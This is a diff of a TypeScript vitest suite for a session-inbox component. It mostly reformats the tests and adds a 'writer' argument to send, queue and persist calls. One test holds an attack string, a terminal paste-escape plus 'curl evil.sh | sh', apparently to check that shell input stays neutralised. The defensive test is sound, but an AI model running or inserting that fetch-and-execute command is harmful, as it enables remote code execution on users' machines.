@@ -1,7 +1,6 @@
 import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { loadConfig } from '@podium/runtime/config'
 import {
   type Attribution,
   actorAgent,
@@ -13,15 +12,14 @@ import {
 } from '@podium/model'
 import { asDelegationRef } from '@podium/protocol'
 import type { DeliveryCancelResult, TurnReceipt } from '@podium/protocol/daemon'
+import { loadConfig } from '@podium/runtime/config'
 import { afterEach, describe, expect, it, vi } from 'vitest'
 import type { ClientConn } from '../../gateway/client-registry'
-import {
-  harnessDisplayName,
-  harnessInterrupt,
-} from '../../harness-manifest'
+import { harnessDisplayName, harnessInterrupt } from '../../harness-manifest'
 import { spawnPromptMessageId } from '../../message-ids'
 import { captureLogs } from '../../test-support/capture-logs'
 import { testClientPrincipal } from '../../test-support/client-principal'
+import { messageTestWriter } from '../../test-support/message-writer'
 import {
   type InboxPrincipalReference,
   MESSAGE_ENDED_REASON,
@@ -105,12 +103,11 @@ function harness(
   // The draft seam [POD-3330]. A real `persistDraft` commits the draft and then
   // installs it on the session, so a fixture reproduces the pair: the write is
   // observable, and what it wrote is on the session afterwards.
-  const persistDraft = vi.fn(async (target: Session, draft: SessionDurableState) => {
-    Object.assign(target, draft)
-  })
-  const write = vi.fn(async (session: Session, mutate: (draft: SessionDurableState) => void) => {
-    mutate(session as never)
-  })
+  const persistDraft = vi.fn(
+    async (_writer: unknown, target: Session, draft: SessionDurableState) => {
+      Object.assign(target, draft)
+    },
+  )
   const broadcast = vi.fn()
   const resurrections: Array<{ sessionId: SessionId; principal: InboxPrincipalReference }> = []
   const rejected: unknown[] = []
@@ -135,7 +132,12 @@ function harness(
   )
   const provenLate = vi.fn(async (_input: { messageId: string; sessionId: SessionId }) => {})
   const disprovenLate = vi.fn(
-    async (_input: { messageId: string; sessionId: SessionId; reason: string; cause: string }) => {},
+    async (_input: {
+      messageId: string
+      sessionId: SessionId
+      reason: string
+      cause: string
+    }) => {},
   )
   const accepted = vi.fn(
     async (_input: {
@@ -151,9 +153,14 @@ function harness(
       transcriptItem: { id: string }
     }) => {},
   )
-  const idMatched = vi.fn(async (_input: {
-    messageId: string; sessionId: SessionId; transcriptItem: { id: string }; harnessRef: { kind: string; id: string }[]
-  }) => {})
+  const idMatched = vi.fn(
+    async (_input: {
+      messageId: string
+      sessionId: SessionId
+      transcriptItem: { id: string }
+      harnessRef: { kind: string; id: string }[]
+    }) => {},
+  )
   const harnessIds = vi.fn(
     async (_input: {
       messageId: string
@@ -236,7 +243,10 @@ function harness(
       count: async (id: SessionId) => rows.filter((row) => row.sessionId === id).length,
       reserveDelivery: async (id) => {
         const row = rows.find((candidate) => candidate.id === id)
-        if (row) { row.attempts = Math.max(row.attempts, 1); row.deliveryOwner = 'daemon' }
+        if (row) {
+          row.attempts = Math.max(row.attempts, 1)
+          row.deliveryOwner = 'daemon'
+        }
       },
       delete: async (id) => {
         const index = rows.findIndex((row) => row.id === id)
@@ -260,8 +270,10 @@ function harness(
     },
     daemon: { sendInput: (_machineId, message) => sent.push(message) },
     authorization: {
-      authorizeAtDrain: options.authorizeAtDrain ?? (async () =>
-        authorized ? ({ ok: true } as const) : ({ ok: false, reason: 'revoked' } as const)),
+      authorizeAtDrain:
+        options.authorizeAtDrain ??
+        (async () =>
+          authorized ? ({ ok: true } as const) : ({ ok: false, reason: 'revoked' } as const)),
       ...(options.handingOn ? { handingOn: options.handingOn } : {}),
       applied,
       injected,
@@ -276,7 +288,9 @@ function harness(
       named,
       idMatched,
       harnessIds,
-      rejected: async (input) => { rejected.push(input) },
+      rejected: async (input) => {
+        rejected.push(input)
+      },
     },
     attention: {
       stateChanged: attentionStateChanged,
@@ -287,12 +301,6 @@ function harness(
     },
     now: () => Date.now(),
     persist,
-    // The draft seam [POD-3330]: a real `write` applies the mutation to a draft
-    // and installs it on the session once the commit returns, so what a fixture
-    // has to reproduce is the mutation landing on the session. Deliberately NOT
-    // routed through `persist`: the assertions below distinguish the durable
-    // write this method makes from the ones its callees make.
-    write,
     draft: (session) => ({ ...session }) as never,
     persistDraft,
     broadcast,
@@ -376,7 +384,6 @@ function harness(
     contractConfigures,
     persist,
     persistDraft,
-    write,
     broadcast,
     resurrections,
     rejected,
@@ -439,56 +446,71 @@ afterEach(() => {
 })
 
 describe('drain invalidation during queue enumeration', () => {
-  it.each(['session replacement', 'inbox disposal'] as const)(
-    'does not resume stale drain work after %s while queue.list is pending',
-    async (invalidation) => {
-      const h = harness({ status: 'parked', transcriptAvailable: true })
-      h.rows.push({
-        delivery: 'when-ready',
-        id: 'held-row', sessionId: SID, text: 'still queued',
-        principal: agentPrincipal(), queuedAt: 0, attempts: 2,
-        inputOrigin: 'mail', sourceMessageId: null,
-      })
-      let release!: (rows: typeof h.rows) => void
-      const pending = new Promise<typeof h.rows>((resolve) => { release = resolve })
-      const order: string[] = []
-      h.listQueue.mockImplementationOnce(() => {
-        order.push('list pending')
-        return pending
-      })
-      const drain = h.inbox.drain(SID).then(() => { order.push('drain returned') })
-      try {
-        expect(order).toEqual(['list pending'])
-        expect(h.getSession).toHaveReturnedWith(h.session)
-        if (invalidation === 'session replacement') {
-          h.getSession.mockReturnValue({ ...h.session } as Session)
-        } else {
-          h.inbox.dispose()
-        }
-        order.push(invalidation)
-        expect(h.rows[0]?.attempts).toBe(2)
-        order.push('list released')
-        release([...h.rows])
-        await drain
-        expect(order).toEqual(['list pending', invalidation, 'list released', 'drain returned'])
-        expect(h.rows[0]?.attempts, 'invalidated drain must not reset queued delivery attempts').toBe(2)
-        expect(h.listQueue, 'invalidated drain must stop before its next queue read').toHaveBeenCalledTimes(1)
-        expect(h.write).not.toHaveBeenCalled()
-        expect(h.resurrect).not.toHaveBeenCalled()
-        expect(h.sent).toEqual([])
-      } finally {
-        release([])
-        await drain
+  it.each([
+    'session replacement',
+    'inbox disposal',
+  ] as const)('does not resume stale drain work after %s while queue.list is pending', async (invalidation) => {
+    const h = harness({ status: 'parked', transcriptAvailable: true })
+    h.rows.push({
+      delivery: 'when-ready',
+      id: 'held-row',
+      sessionId: SID,
+      text: 'still queued',
+      principal: agentPrincipal(),
+      queuedAt: 0,
+      attempts: 2,
+      inputOrigin: 'mail',
+      sourceMessageId: null,
+    })
+    let release!: (rows: typeof h.rows) => void
+    const pending = new Promise<typeof h.rows>((resolve) => {
+      release = resolve
+    })
+    const order: string[] = []
+    h.listQueue.mockImplementationOnce(() => {
+      order.push('list pending')
+      return pending
+    })
+    const drain = h.inbox.drain(SID).then(() => {
+      order.push('drain returned')
+    })
+    try {
+      expect(order).toEqual(['list pending'])
+      expect(h.getSession).toHaveReturnedWith(h.session)
+      if (invalidation === 'session replacement') {
+        h.getSession.mockReturnValue({ ...h.session } as Session)
+      } else {
         h.inbox.dispose()
       }
-    },
-  )
+      order.push(invalidation)
+      expect(h.rows[0]?.attempts).toBe(2)
+      order.push('list released')
+      release([...h.rows])
+      await drain
+      expect(order).toEqual(['list pending', invalidation, 'list released', 'drain returned'])
+      expect(h.rows[0]?.attempts, 'invalidated drain must not reset queued delivery attempts').toBe(
+        2,
+      )
+      expect(
+        h.listQueue,
+        'invalidated drain must stop before its next queue read',
+      ).toHaveBeenCalledTimes(1)
+      expect(h.resurrect).not.toHaveBeenCalled()
+      expect(h.sent).toEqual([])
+    } finally {
+      release([])
+      await drain
+      h.inbox.dispose()
+    }
+  })
 })
 
 describe('SessionInbox persistence completion', () => {
   function barrier() {
     let release!: () => void
-    const promise = new Promise<void>((resolve) => { release = resolve })
+    const promise = new Promise<void>((resolve) => {
+      release = resolve
+    })
     return { promise, release }
   }
 
@@ -498,8 +520,11 @@ describe('SessionInbox persistence completion', () => {
     const pending = barrier()
     h.persistDraft.mockImplementationOnce(() => pending.promise)
     let finished = false
-    const operation = h.inbox.configureSession({ sessionId: SID, model: 'new-model' })
-      .then(() => { finished = true })
+    const operation = h.inbox
+      .configureSession({ writer: messageTestWriter(), sessionId: SID, model: 'new-model' })
+      .then(() => {
+        finished = true
+      })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.persistDraft).toHaveBeenCalledOnce()
     expect(h.broadcast).not.toHaveBeenCalled()
@@ -513,7 +538,9 @@ describe('SessionInbox persistence completion', () => {
     const h = harness({ contractConfigure: { ok: true, effective: 'next-turn' } })
     const error = new Error('model commit failed')
     h.persistDraft.mockRejectedValueOnce(error)
-    await expect(h.inbox.configureSession({ sessionId: SID, model: 'new-model' })).rejects.toBe(error)
+    await expect(
+      h.inbox.configureSession({ writer: messageTestWriter(), sessionId: SID, model: 'new-model' }),
+    ).rejects.toBe(error)
     expect(h.broadcast).not.toHaveBeenCalled()
   })
 
@@ -525,11 +552,21 @@ describe('SessionInbox persistence completion', () => {
       await pending.promise
     })
     let finished = false
-    const operation = h.inbox.queueText({ sessionId: SID, text: 'queued', principal: agentPrincipal() })
-      .then(() => { finished = true })
+    const operation = h.inbox
+      .queueText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'queued',
+        principal: agentPrincipal(),
+      })
+      .then(() => {
+        finished = true
+      })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.persist).toHaveBeenCalledOnce()
-    expect(h.persist).toHaveBeenCalledWith(h.session, { cancelTerminalCandidate: true })
+    expect(h.persist).toHaveBeenCalledWith(expect.anything(), h.session, {
+      cancelTerminalCandidate: true,
+    })
     expect(h.rows).toHaveLength(1)
     expect(h.broadcast).not.toHaveBeenCalled()
     expect(finished).toBe(false)
@@ -542,8 +579,14 @@ describe('SessionInbox persistence completion', () => {
     const h = harness()
     const error = new Error('session commit failed')
     h.persist.mockRejectedValueOnce(error)
-    await expect(h.inbox.queueText({ sessionId: SID, text: 'queued', principal: agentPrincipal() }))
-      .rejects.toBe(error)
+    await expect(
+      h.inbox.queueText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'queued',
+        principal: agentPrincipal(),
+      }),
+    ).rejects.toBe(error)
     expect(h.broadcast).not.toHaveBeenCalled()
   })
 
@@ -551,7 +594,12 @@ describe('SessionInbox persistence completion', () => {
     vi.useFakeTimers()
     // Parked, so the row is still queued when the session is archived.
     const h = harness({ status: 'hibernated', agentKind: 'shell' })
-    await h.inbox.queueText({ sessionId: SID, text: 'recover me', principal: agentPrincipal() })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'recover me',
+      principal: agentPrincipal(),
+    })
     expect(h.rows).toHaveLength(1)
     Object.assign(h.session, { archived: true })
     h.setStatus('live')
@@ -587,7 +635,12 @@ describe('SessionInbox: a stored errored phase holds nothing (POD-4775)', () => 
     const h = harness({ contractReceipts: [] })
     erred(h)
     expect(
-      await h.inbox.sendText({ sessionId: SID, text: 'third message', principal: agentPrincipal() }),
+      await h.inbox.sendText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'third message',
+        principal: agentPrincipal(),
+      }),
     ).toEqual({ ok: true, queued: true })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.contractCalls).toEqual([expect.objectContaining({ text: 'third message' })])
@@ -597,8 +650,14 @@ describe('SessionInbox: a stored errored phase holds nothing (POD-4775)', () => 
     vi.useFakeTimers()
     // Pending custody keeps the first forward open while the failure lands.
     const h = harness({ contractPending: true })
-    await h.inbox.queueText({ sessionId: SID, text: 'first', principal: agentPrincipal() })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'first',
+      principal: agentPrincipal(),
+    })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'already accepted',
       principal: agentPrincipal(),
@@ -623,7 +682,12 @@ describe('SessionInbox: a stored errored phase holds nothing (POD-4775)', () => 
     vi.useFakeTimers()
     const h = harness({ agentKind: 'shell' })
     erred(h)
-    await h.inbox.queueText({ sessionId: SID, text: 'still typed', principal: agentPrincipal() })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'still typed',
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(0)
     expect(typedTexts(h.sent)).toContain('still typed')
     expect(h.promptFailed).not.toHaveBeenCalled()
@@ -634,15 +698,33 @@ describe('SessionInbox archived boundary', () => {
   it('refuses direct and resumable sends before enqueue or resurrection', async () => {
     const h = harness({ status: 'hibernated', archived: true })
 
-    expect(await h.inbox.sendText({ sessionId: SID, text: 'do not revive' })).toEqual({
+    expect(
+      await h.inbox.sendText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'do not revive',
+      }),
+    ).toEqual({
       ok: false,
       reason: 'session is archived',
     })
-    expect(await h.inbox.queueText({ sessionId: SID, text: 'do not queue' })).toEqual({
+    expect(
+      await h.inbox.queueText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'do not queue',
+      }),
+    ).toEqual({
       ok: false,
       reason: 'session is archived',
     })
-    expect(await h.inbox.resumeAndSend({ sessionId: SID, text: 'do not resume' })).toEqual({
+    expect(
+      await h.inbox.resumeAndSend({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'do not resume',
+      }),
+    ).toEqual({
       ok: false,
       reason: 'session is archived',
     })
@@ -658,13 +740,20 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     vi.setSystemTime(0)
     let resolve!: (decision: import('./inbox').InboxAuthorizationDecision) => void
-    const pending = new Promise<import('./inbox').InboxAuthorizationDecision>((done) => { resolve = done })
+    const pending = new Promise<import('./inbox').InboxAuthorizationDecision>((done) => {
+      resolve = done
+    })
     let calls = 0
     const h = harness({
       agentKind: 'shell',
       authorizeAtDrain: () => (++calls === 1 ? pending : Promise.resolve({ ok: true })),
     })
-    const drained = h.inbox.queueText({ sessionId: SID, text: 'wait for the database', principal: agentPrincipal() })
+    const drained = h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'wait for the database',
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(7_000)
     expect(calls).toBe(1)
     expect(h.rows).toHaveLength(1)
@@ -689,18 +778,38 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     vi.setSystemTime(Date.parse('2026-09-24T10:15:00.000Z'))
     const h = harness({ contractReceipts: [] })
-    const text = 'What is 3 times 3? Reply with only the number followed by the word BEE in capitals.'
-    await h.inbox.queueText({ sessionId: SID, text, mutationId: asMutationId('repeat-first'), principal: agentPrincipal() })
+    const text =
+      'What is 3 times 3? Reply with only the number followed by the word BEE in capitals.'
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text,
+      mutationId: asMutationId('repeat-first'),
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(1_000)
-    expect((h.contractCalls as { turnId: string }[]).map((call) => call.turnId)).toEqual(['repeat-first'])
+    expect((h.contractCalls as { turnId: string }[]).map((call) => call.turnId)).toEqual([
+      'repeat-first',
+    ])
     // The agent answered: the first prompt is a user turn in the transcript.
-    h.transcript.push({ id: 'u-first', role: 'user', text, ts: '2026-09-24T10:15:05.000Z' } as never)
+    h.transcript.push({
+      id: 'u-first',
+      role: 'user',
+      text,
+      ts: '2026-09-24T10:15:05.000Z',
+    } as never)
     await h.inbox.deliveryOutcome(SID, { rowId: 'repeat-first', outcome: 'delivered' })
     expect(h.rows).toEqual([])
 
     // Within five minutes the operator sends the exact same text again.
     vi.setSystemTime(Date.parse('2026-09-24T10:16:00.000Z'))
-    await h.inbox.queueText({ sessionId: SID, text, mutationId: asMutationId('repeat-second'), principal: agentPrincipal() })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text,
+      mutationId: asMutationId('repeat-second'),
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(1_000)
 
     expect((h.contractCalls as { turnId: string }[]).map((call) => call.turnId)).toEqual([
@@ -720,17 +829,35 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     vi.setSystemTime(Date.parse('2026-09-24T10:20:00.000Z'))
     const h = harness({ contractReceipts: [] })
-    const head = 'Write the numbers from 1 to 200 in order, separated by commas, with no other text. '
+    const head =
+      'Write the numbers from 1 to 200 in order, separated by commas, with no other text. '
     const first = `${head}(run 40-41)`
     const second = `${head}(run 65-43)`
     expect(head.length).toBeGreaterThan(80)
-    await h.inbox.queueText({ sessionId: SID, text: first, mutationId: asMutationId('prefix-first'), principal: agentPrincipal() })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: first,
+      mutationId: asMutationId('prefix-first'),
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(1_000)
-    h.transcript.push({ id: 'u-prefix', role: 'user', text: first, ts: '2026-09-24T10:20:05.000Z' } as never)
+    h.transcript.push({
+      id: 'u-prefix',
+      role: 'user',
+      text: first,
+      ts: '2026-09-24T10:20:05.000Z',
+    } as never)
     await h.inbox.deliveryOutcome(SID, { rowId: 'prefix-first', outcome: 'delivered' })
 
     vi.setSystemTime(Date.parse('2026-09-24T10:24:00.000Z'))
-    await h.inbox.queueText({ sessionId: SID, text: second, mutationId: asMutationId('prefix-second'), principal: agentPrincipal() })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: second,
+      mutationId: asMutationId('prefix-second'),
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(1_000)
 
     expect((h.contractCalls as { turnId: string }[]).map((call) => call.turnId)).toEqual([
@@ -744,9 +871,16 @@ describe('SessionInbox authorization and identity', () => {
   it('delivers only after the database grants drain authorization', async () => {
     vi.useFakeTimers()
     let resolve!: (decision: import('./inbox').InboxAuthorizationDecision) => void
-    const pending = new Promise<import('./inbox').InboxAuthorizationDecision>((done) => { resolve = done })
+    const pending = new Promise<import('./inbox').InboxAuthorizationDecision>((done) => {
+      resolve = done
+    })
     const h = harness({ contractReceipts: [], authorizeAtDrain: () => pending })
-    await h.inbox.queueText({ sessionId: SID, text: 'authorized later', principal: agentPrincipal() })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'authorized later',
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(1_000)
     expect(h.rows).toHaveLength(1)
     expect(h.contractCalls).toEqual([])
@@ -769,6 +903,7 @@ describe('SessionInbox authorization and identity', () => {
     h.revoke()
     expect(
       await h.inbox.queueText({
+        writer: messageTestWriter(),
         sessionId: SID,
         text: 'queued before revocation',
         mutationId: asMutationId('queued-1'),
@@ -795,6 +930,7 @@ describe('SessionInbox authorization and identity', () => {
     const h = harness({ agentKind: 'shell' })
 
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'deliver after boot',
       mutationId: asMutationId('queued-apply'),
@@ -810,6 +946,7 @@ describe('SessionInbox authorization and identity', () => {
     // A row still held (parked: no process to type into) confirms nothing.
     const held = harness({ agentKind: 'shell', status: 'hibernated' })
     await held.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'held',
       mutationId: asMutationId('queued-held-apply'),
@@ -829,17 +966,48 @@ describe('SessionInbox authorization and identity', () => {
     const h = harness({ agentKind, handingOn, contractReceipts: [] })
 
     const r = await h.inbox[verb]({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'retracted meanwhile',
       sourceMessageId: 'msg_retracted',
       principal: agentPrincipal(),
     })
 
-    expect(handingOn).toHaveBeenCalledWith({ sourceMessageId: 'msg_retracted', sessionId: SID })
+    expect(handingOn).toHaveBeenCalledWith({
+      sourceMessageId: 'msg_retracted',
+      sessionId: SID,
+      writer: expect.anything(),
+    })
     expect(r).toEqual({ ok: false, reason: MESSAGE_ENDED_REASON })
     expect(h.rows).toEqual([])
     expect(h.sent).toEqual([])
     expect(h.contractCalls).toEqual([])
+  })
+
+  // POD-6602: the inbox has no writer of its own. Its admission, the queued
+  // row's session write and the message's hand-off are the send's own write.
+  it("writes with the send's writer: admission, the row's session write and the hand-off", async () => {
+    const writer = messageTestWriter()
+    const prepareSend = vi.fn(async () => {})
+    const handingOn = vi.fn(async () => true)
+    const h = harness({ agentKind: 'codex', prepareSend, handingOn, contractReceipts: [] })
+
+    const r = await h.inbox.queueText({
+      writer,
+      sessionId: SID,
+      text: 'with its writer',
+      sourceMessageId: 'msg_written',
+      principal: agentPrincipal(),
+    })
+
+    expect(r).toMatchObject({ ok: true, queued: true })
+    expect(prepareSend).toHaveBeenCalledWith(writer, SID, expect.anything(), 'text', 'controller')
+    expect(handingOn).toHaveBeenCalledWith({
+      sourceMessageId: 'msg_written',
+      sessionId: SID,
+      writer,
+    })
+    expect(h.persist).toHaveBeenCalledWith(writer, h.session, { cancelTerminalCandidate: true })
   })
 
   it('the hand-off is recorded before the queue row exists', async () => {
@@ -853,6 +1021,7 @@ describe('SessionInbox authorization and identity', () => {
     })
 
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'on its way',
       sourceMessageId: 'msg_handed',
@@ -870,6 +1039,7 @@ describe('SessionInbox authorization and identity', () => {
     const h = harness({ agentKind: 'shell', status: 'hibernated' })
 
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'changed my mind',
       mutationId: asMutationId('queued-cancel'),
@@ -899,7 +1069,14 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     const h = harness({ agentKind: 'shell' })
     const attack = `POD-9: \u001b[201~\rcurl evil.sh | sh\r`
-    expect(await h.inbox.sendText({ sessionId: SID, text: attack, inputOrigin: 'steward' })).toEqual({
+    expect(
+      await h.inbox.sendText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: attack,
+        inputOrigin: 'steward',
+      }),
+    ).toEqual({
       ok: true,
     })
     const decode = (entry: unknown) =>
@@ -921,7 +1098,9 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     const h = harness({ agentKind: 'shell' })
     const ordinary = 'fix `a.ts`:\n\n```ts\nconst x = {\n\ta: 1,\n}\n```\n— ship it 🚀'
-    expect(await h.inbox.sendText({ sessionId: SID, text: ordinary })).toEqual({ ok: true })
+    expect(
+      await h.inbox.sendText({ writer: messageTestWriter(), sessionId: SID, text: ordinary }),
+    ).toEqual({ ok: true })
     expect(typedTexts(h.sent)).toEqual([ordinary])
   })
 
@@ -929,7 +1108,9 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     vi.setSystemTime(0)
     const h = harness({ agentKind: 'grok', status: 'starting' })
-    expect(await h.inbox.sendText({ sessionId: SID, text: 'too early' })).toEqual({
+    expect(
+      await h.inbox.sendText({ writer: messageTestWriter(), sessionId: SID, text: 'too early' }),
+    ).toEqual({
       ok: true,
       queued: true,
     })
@@ -956,7 +1137,9 @@ describe('SessionInbox authorization and identity', () => {
     // `live` says nothing about whether the composer is mounted, so the first
     // send goes through the durable queue and settles on the daemon's delivery
     // event — never on what the server thinks the transcript says (POD-4687).
-    expect(await h.inbox.sendText({ sessionId: SID, text: 'first' })).toEqual({ ok: true, queued: true })
+    expect(
+      await h.inbox.sendText({ writer: messageTestWriter(), sessionId: SID, text: 'first' }),
+    ).toEqual({ ok: true, queued: true })
     expect(h.sent).toEqual([])
     expect(h.rows).toHaveLength(1)
   })
@@ -980,7 +1163,13 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     const h = harness({ agentKind: 'shell', phase: 'needs_user' })
 
-    expect(await h.inbox.sendText({ sessionId: SID, text: 'this must NOT submit the menu' })).toEqual({
+    expect(
+      await h.inbox.sendText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'this must NOT submit the menu',
+      }),
+    ).toEqual({
       ok: false,
     })
     // Refused, not deferred: nothing typed AND nothing left holding a turn.
@@ -992,7 +1181,9 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     const h = harness({ agentKind: 'claude-code', status: 'exited' })
 
-    expect(await h.inbox.sendText({ sessionId: SID, text: 'hello?' })).toEqual({ ok: false })
+    expect(
+      await h.inbox.sendText({ writer: messageTestWriter(), sessionId: SID, text: 'hello?' }),
+    ).toEqual({ ok: false })
     expect(h.sent).toEqual([])
     expect(h.rows).toHaveLength(0)
   })
@@ -1008,6 +1199,7 @@ describe('SessionInbox authorization and identity', () => {
       const principal = agentPrincipal()
       expect(
         await h.inbox.queueText({
+          writer: messageTestWriter(),
           sessionId: SID,
           text: 'survive the dead-child race',
           principal,
@@ -1040,13 +1232,21 @@ describe('SessionInbox authorization and identity', () => {
     expect(await noRow.inbox.recoverQueuedAfterExit(SID)).toBe(false)
 
     const archived = exactGrok()
-    await archived.inbox.queueText({ sessionId: SID, text: 'retired target' })
+    await archived.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'retired target',
+    })
     archived.setStatus('exited')
     ;(archived.session as unknown as { archived: boolean }).archived = true
     expect(await archived.inbox.recoverQueuedAfterExit(SID)).toBe(false)
 
     const unboundAgent = exactGrok()
-    await unboundAgent.inbox.queueText({ sessionId: SID, text: 'no conversation to resume' })
+    await unboundAgent.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'no conversation to resume',
+    })
     unboundAgent.setStatus('exited')
     ;(unboundAgent.session as unknown as { resume?: unknown }).resume = undefined
     expect(await unboundAgent.inbox.recoverQueuedAfterExit(SID)).toBe(false)
@@ -1070,10 +1270,7 @@ describe('SessionInbox authorization and identity', () => {
       'OpenCode',
       { agentKind: 'opencode' as const, hasBoundDriver: true, driverId: 'opencode-server' },
     ],
-    [
-      'shell',
-      { agentKind: 'shell' as const, hasBoundDriver: false, driverId: 'generic-pty' },
-    ],
+    ['shell', { agentKind: 'shell' as const, hasBoundDriver: false, driverId: 'generic-pty' }],
   ])('does not auto-spawn %s after exit', async (_label, identity) => {
     vi.useFakeTimers()
     // The drain waits on authorization, so the row is still queued at exit.
@@ -1083,7 +1280,11 @@ describe('SessionInbox authorization and identity', () => {
     })
     // Not awaited: a shell's queueText awaits its drain, which is parked on
     // authorization for the rest of the test.
-    void h.inbox.queueText({ sessionId: SID, text: 'keep explicit recovery semantics' })
+    void h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'keep explicit recovery semantics',
+    })
     await vi.advanceTimersByTimeAsync(0)
     h.setStatus('exited')
 
@@ -1101,7 +1302,9 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     const h = harness({ agentKind: 'claude-code', phase: 'idle' })
 
-    expect(await h.inbox.sendText({ sessionId: SID, text: 'now ok' })).toEqual({
+    expect(
+      await h.inbox.sendText({ writer: messageTestWriter(), sessionId: SID, text: 'now ok' }),
+    ).toEqual({
       ok: true,
       queued: true,
     })
@@ -1132,7 +1335,13 @@ describe('SessionInbox authorization and identity', () => {
     const h = harness({ agentKind: 'shell' })
     const principal = agentPrincipal()
     expect(
-      await h.inbox.sendText({ sessionId: SID, text: 'mail', inputOrigin: 'mail', principal }),
+      await h.inbox.sendText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'mail',
+        inputOrigin: 'mail',
+        principal,
+      }),
     ).toEqual({ ok: true })
     const decode = (entry: unknown) =>
       Buffer.from((entry as { bytes: Uint8Array }).bytes).toString()
@@ -1176,6 +1385,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.sendText({
+        writer: messageTestWriter(),
         sessionId: SID,
         text: 'do not submit after Escape',
         sourceMessageId: 'message-chat-send',
@@ -1233,34 +1443,65 @@ describe('SessionInbox authorization and identity', () => {
 
   it('waits for physical retraction before resolving an interrupt', async () => {
     const h = harness({ agentKind: 'codex', phase: 'working' })
-    await h.inbox.sendText({ sessionId: SID, text: 'cancel me', sourceMessageId: 'm1' })
+    await h.inbox.sendText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'cancel me',
+      sourceMessageId: 'm1',
+    })
     let release!: () => void
-    const pending = new Promise<void>((resolve) => { release = resolve })
+    const pending = new Promise<void>((resolve) => {
+      release = resolve
+    })
     h.interrupted.mockImplementationOnce(() => pending)
     let settled = false
-    const result = h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
-      .then((value) => { settled = true; return value })
+    const result = h.inbox
+      .interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+      .then((value) => {
+        settled = true
+        return value
+      })
     await vi.waitFor(() => expect(h.interrupted).toHaveBeenCalled())
-    try { expect(settled).toBe(false) } finally { release(); await result }
+    try {
+      expect(settled).toBe(false)
+    } finally {
+      release()
+      await result
+    }
   })
 
   it('propagates the exact physical retraction failure', async () => {
     const h = harness({ agentKind: 'codex', phase: 'working' })
-    await h.inbox.sendText({ sessionId: SID, text: 'cancel me', sourceMessageId: 'm1' })
+    await h.inbox.sendText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'cancel me',
+      sourceMessageId: 'm1',
+    })
     const failure = new Error('physical retraction write failed')
     h.interrupted.mockRejectedValueOnce(failure)
-    await expect(h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() }))
-      .rejects.toBe(failure)
+    await expect(
+      h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).rejects.toBe(failure)
   })
 
   it('waits for pending retraction before resolving an interrupt', async () => {
     const h = harness({ agentKind: 'codex', phase: 'working' })
     let release!: () => void
-    const pending = new Promise<void>((resolve) => { release = resolve })
+    const pending = new Promise<void>((resolve) => {
+      release = resolve
+    })
     h.interruptedPending.mockImplementationOnce(() => pending)
     let settled = false
-    const result = h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
-      .then((value) => { settled = true; return value })
